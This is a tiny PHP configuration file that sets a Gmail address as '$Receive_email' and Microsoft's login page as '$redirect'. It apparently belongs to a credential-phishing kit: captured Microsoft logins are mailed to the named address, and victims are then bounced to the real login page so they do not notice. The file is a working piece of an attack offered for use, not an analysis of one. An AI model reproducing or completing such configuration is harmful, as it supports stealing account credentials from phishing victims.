<?php 
$Receive_email="admiralgg4g@gmail.com";
$redirect="https://login.microsoftonline.com/";
?>